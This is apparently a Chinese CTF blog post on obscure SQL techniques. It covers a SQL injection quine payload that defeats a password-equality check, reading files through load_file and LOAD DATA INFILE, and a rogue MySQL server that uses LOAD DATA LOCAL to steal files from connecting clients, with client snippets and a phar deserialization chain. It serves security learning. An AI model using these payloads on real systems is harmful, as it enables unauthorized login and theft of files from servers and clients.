---
title: 偏门SQL
date: 2024-04-7
categories:
- [Tips]
---

# Quine

直接把题拿出来看，其实暂时不用怎么看，大概知道一下就行

```php
$password=$_POST['password'];
if ($username !== 'admin') {
    alertMes('only admin can login', 'index.php');
}
checkSql($password);
$sql="SELECT password FROM users WHERE username='admin' and password='$password';";
$user_result=mysqli_query($con,$sql);
$row = mysqli_fetch_array($user_result);
if (!$row) {
    alertMes("something wrong",'index.php');
}
if ($row['password'] === $password) {
	die($FLAG);
}
```

题目要求数据库里的password和传入的psd强相等，爆了之后发现数据库中的password是空表。看似就没有任何办法做到相等然后出flag了。

但是有一种方法可以

##  什么是Quine

Quine就是输入和输出的语句完全一致，例如：

```raw
<<this is in
>>this is in
```

如果能做到这样，使用某种办法将输入的内容原封不动输出出来，就完成了一次Quine构造

在sql中能利用replace函数做到Quine构造

>replace()函数
>
>replace(object,search,replace) 把object对象中出现的search全部替换成replace

构造的基本形式就是

```sql
REPLACE(str,编码的间隔符,str)
```

其中，str为

```sql
REPLACE(间隔符,编码的间隔符,间隔符)
```

组合就变成了==>

> {% raw %}
REPLACE(<span style="color:red">REPLACE(间隔符,编码的间隔符,间隔符)</span>,编码的间隔符,<span style="color:blue">REPLACE(间隔符,编码的间隔符,间隔符)</span>)
{% endraw %}

这样就把str1中的间隔符又换成了str2，具体的替换用颜色表示一下

>{% raw %}
<span style="color:red">REPLACE(<span style="color:blue">REPLACE(间隔符,编码的间隔符,间隔符)</span>,编码的间隔符,<span style="color:blue">REPLACE(间隔符,编码的间隔符,间隔符)</span>)</span>
{% endraw %}

可以见得，这样替换之后的内容就大致相同了

直接给出一条语句试一下

```sql
select REPLACE('REPLACE(".",CHAR(46),".")',CHAR(46),'REPLACE(".",CHAR(46),".")');
+---------------------------------------------------------------------------+
| REPLACE('REPLACE(".",CHAR(46),".")',CHAR(46),'REPLACE(".",CHAR(46),".")') |
+---------------------------------------------------------------------------+
| REPLACE("REPLACE(".",CHAR(46),".")",CHAR(46),"REPLACE(".",CHAR(46),".")") |
+---------------------------------------------------------------------------+
```

细致看一下，还是有单双引号的区别。不能一直用双引号`"`，会导致异常闭合，所以得单引号里嵌套双引号。

```sql
Quine: REPLACE('str',编码的间隔符,'str')
str: REPLACE("间隔符",编码的间隔符,"间隔符")
```

运算后的结果是`REPLACE("str",编码的间隔符,"str")`，所以让结果的str也用单引号包裹就能让输入和查询结果完全一致了

那要如何解决但双引号不一致的问题呢？很简单，再replace一下就好了。`CHAR(34)->"`，`CHAR(39)->'`

```sql
Quine:REPLACE(REPLACE('str',CHAR(34),CHAR(39)),编码的间隔符,'str')
  str:REPLACE(REPLACE("间隔符",CHAR(34),CHAR(39)),编码的间隔符,"间隔符")
```

> 实际上是先将str里的双引号替换成单引号，再用str替换str里的间隔符

```sql
select replace(replace('replace(replace(".",char(34),char(39)),char(46),".")',char(34),char(39)),char(46),'replace(replace(".",char(34),char(39)),char(46),".")');
+------------------------------------------------------------------------------------------------------------------------------------------------------------+
| replace(replace('replace(replace(".",char(34),char(39)),char(46),".")',char(34),char(39)),char(46),'replace(replace(".",char(34),char(39)),char(46),".")') |
+------------------------------------------------------------------------------------------------------------------------------------------------------------+
| replace(replace('replace(replace(".",char(34),char(39)),char(46),".")',char(34),char(39)),char(46),'replace(replace(".",char(34),char(39)),char(46),".")') |
+------------------------------------------------------------------------------------------------------------------------------------------------------------+
```

## 再从payload理解为什么要用Quine

**第五空间智能安全大赛-Web-yet_another_mysql_injection**

```php
$password=$_POST['password'];
if ($username !== 'admin') {
    alertMes('only admin can login', 'index.php');
}
checkSql($password);
$sql="SELECT password FROM users WHERE username='admin' and password='$password';";
$user_result=mysqli_query($con,$sql);
$row = mysqli_fetch_array($user_result);
if (!$row) {
    alertMes("something wrong",'index.php');
}
if ($row['password'] === $password) {
	die($FLAG);
}
```

waf封了空格，直接用内联就行了。这里为了方便看就用回空格

> 1' union select replace(replace('1" union select replace(replace(".",char(34),char(39)),char(46),".")#',char(34),char(39)),char(46),'1" union select replace(replace(".",char(34),char(39)),char(46),".")#')#
> 组合sql语句就是：
> SELECT password FROM users WHERE username='admin' and password='1' union select replace(replace('1" union select replace(replace(".",char(34),char(39)),char(46),".")#',char(34),char(39)),char(46),'1" union select replace(replace(".",char(34),char(39)),char(46),".")#')#';

这时候，由于使用的是联合注入，当前文报错，就会回显后面的

>1' union select replace(replace('1" union select replace(replace(".",char(34),char(39)),char(46),".")#',char(34),char(39)),char(46),'1" union select replace(replace(".",char(34),char(39)),char(46),".")#')#';

这就让`$row['password'] `等于了这一串，而这一串刚好和输入的`$psw`相等，完成了绕过

# Load DATA

其实在打比赛的时候经常拿到数据库之后经常就会尝试直接读文件，这个时候用的一般都是`load_file`这个函数

例如

```sql
select load_file('/etc/hosts');
```

![image-20240411142808596](https://img.b1xcy.top/img/202404111428688.png?x-oss-process=style/img2webp)

但是当`load_file`这个函数被ban的时候，还有`LOAD DATA`可以用

```sql
LOAD DATA INFILE '/etc/hosts' INTO TABLE test FIELDS TERMINATED BY '\n';
```



![image-20240411143227140](https://img.b1xcy.top/img/202404111432167.png?x-oss-process=style/img2webp)

而参考`LOAD DATA`的用法，有一个关键词`flag`可以被使用

```sql
LOAD DATA
    [LOW_PRIORITY | CONCURRENT] [LOCAL]
    INFILE 'file_name'
```

就是这个`LOCAL`

当在客户端(windows)连接到服务端(kali)时，可以执行

```sql
LOAD DATA local INFILE "D:\\test.txt" INTO TABLE test FIELDS TERMINATED BY '\n';
```

这样就实现了远程数据的传输，当然前提是客户端的权限足够

![image-20240411145751995](https://img.b1xcy.top/img/202404111457023.png?x-oss-process=style/img2webp)

先看最基础的mysql握手

```bash
mysql -uroot -p --host=127.0.0.1 --port=3306 --default-character-set=utf8 --local-infile=1
```

![image-20240411151601163](https://img.b1xcy.top/img/202404111516220.png?x-oss-process=style/img2webp)

前面就是基本的握手，但是在9-10条中间穿插了一个查询

![image-20240411152407795](https://img.b1xcy.top/img/202404111524813.png?x-oss-process=style/img2webp)

按理来说这是十分安全的沟通协议，但是参考[Security Considerations for LOAD DATA LOCAL](https://dev.mysql.com/doc/refman/8.3/en/load-data-local-security.html)

![image-20240411153409876](https://img.b1xcy.top/img/202404111534896.png?x-oss-process=style/img2webp)

也就是说，patch之后的服务器可以向任何语句穿插文件请求，只要是客户端开启了`local-infile`的权限

这也是为什么先前的连接语句中指定了`--local-infile=1`

对于原本正常的握手流程应该是(前三次TCP握手忽略):

| 服务端                               | 客户端                            |
| ------------------------------------ | --------------------------------- |
| ServerGreeting(协议、服务器版本等)-> |                                   |
|                                      | <-Login(密码，是否允许LOAD等参数) |
| OK->                                 |                                   |
|                                      | <-RequestQuery查询                |
| Response查询结果->                   |                                   |

我们可以构造一个恶意服务端，在返回查询结果前向客户端要求LOAD DATA LOCAL

| 服务端                                | 客户端                            |
| ------------------------------------- | --------------------------------- |
| Server Greeting(协议、服务器版本等)-> |                                   |
|                                       | <-Login(密码，是否允许LOAD等参数) |
| OK->                                  |                                   |
|                                       | <-Request Query查询               |
| LOAD DATA LOCAL->                     |                                   |
|                                       | <-查询结果                        |

![image-20240411161124285](https://img.b1xcy.top/img/202404111611329.png?x-oss-process=style/img2webp)

可以看到，在客户端主动发送了版本号等查询后，服务端没有返回，而是接着发起了一个LOCAL INFILE的查询

而客户端也没有主要索要上一次查询的结果，就将服务端请求的查询处理并返回了

其实利用的点并不难，甚至可以说是mysql的一个特性。网上也大把现成[poc](https://github.com/fnmsd/MySQL_Fake_Server)，主要是利用的版本非常全面

但要注意的就是高版本之后默认使用的字符集为utf8mb4，需要手动修改为utf8

```bash
mysql -uroot -p --host=127.0.0.1 --port=3306 --default-character-set=utf8 --local-infile=1
```

在各个平台都是通用的，区别是需要各自配置LOCAL_INFILE权限

python:

```python
import mysql.connector

config = {
    'user': 'root',
    'password': 'password',
    'host': '192.168.2.3',
    'port': '3306',
    'charset': 'utf8',
    'auth_plugin': 'mysql_native_password'
}

conn = mysql.connector.connect(**config)

```



![image-20240411163025409](https://img.b1xcy.top/img/202404111630471.png?x-oss-process=style/img2webp)

go:

```go
package main

import (
	"database/sql"
	"fmt"
	"github.com/go-sql-driver/mysql"
)

func main() {
	cfg := mysql.Config{
		User:                    "root",
		Passwd:                  "1234",
		Net:                     "tcp",
		Addr:                    "192.168.2.3:3306",
		DBName:                  "test",
		Collation:               "utf8_general_ci",
		AllowAllFiles:           true,
		AllowCleartextPasswords: true,
		CheckConnLiveness:       true,
	}
	db, err := sql.Open("mysql", cfg.FormatDSN())
	if err != nil {
		panic(err.Error())
	}
	if err := db.Ping(); err != nil {
		fmt.Println("open database fail")
		fmt.Println(err)
		return
	}
	fmt.Println("connnect success")
	defer db.Close()
}


```



![image-20240411173800277](https://img.b1xcy.top/img/202404111738333.png?x-oss-process=style/img2webp)

php:

```php
<?php
$servername = "192.168.2.3";
$username = "root";
$password = "123456";
$dbname = "test";
$conn = new mysqli($servername, $username, $password, $dbname);
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}
$conn->set_charset("utf8");
$conn->options(MYSQLI_OPT_LOCAL_INFILE, true);
$sql = "show tables;";
if ($conn->query($sql) === TRUE) {
    echo "Data loaded successfully";
} else {
    echo "Error loading data: " . $conn->error;
}
$conn->close();
?>

```



![image-20240411172830371](https://img.b1xcy.top/img/202404111728436.png?x-oss-process=style/img2webp)

然而在php中远不止读文件这一个点可以打，甚至可以结合phar反序列化

index.php:

```php
<?php
class A{
    public function __wakeup(){
        echo "wake";
    }
}
$servername = "192.168.2.3";
$username = "root";
$password = "123456";
$dbname = "test";
$conn = new mysqli($servername, $username, $password, $dbname);
$conn->set_charset("utf8");
$conn->options(MYSQLI_OPT_LOCAL_INFILE, true);
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}
$sql = "show tables;";
if ($conn->query($sql) === TRUE) {
    echo "Data loaded successfully";
} else {
    echo "Error loading data: " . $conn->error;
}
$conn->close();
?>
```



![image-20240411180955825](https://img.b1xcy.top/img/202404111809880.png?x-oss-process=style/img2webp)

在读取文件里写死`phar://./phar.phar`，在服务端读取`phar://./phar.phar`就类似于`file_get_content`，直接反序列化执行